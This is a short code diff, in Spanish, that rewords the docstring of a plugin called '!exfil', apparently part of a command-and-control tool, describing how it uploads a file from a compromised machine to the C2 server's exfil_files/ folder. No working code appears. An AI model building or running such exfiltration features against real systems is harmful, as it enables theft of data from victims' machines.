@@ -1,5 +1,5 @@
 """
-Plugin !exfil — exfiltra un archivo de la víctima al servidor C2.
+Plugin !exfil — exfiltra un archivo de la máquina vulnerada al servidor C2.
 !exfil <ruta>   → sube el archivo al servidor y lo guarda en exfil_files/
 """
 
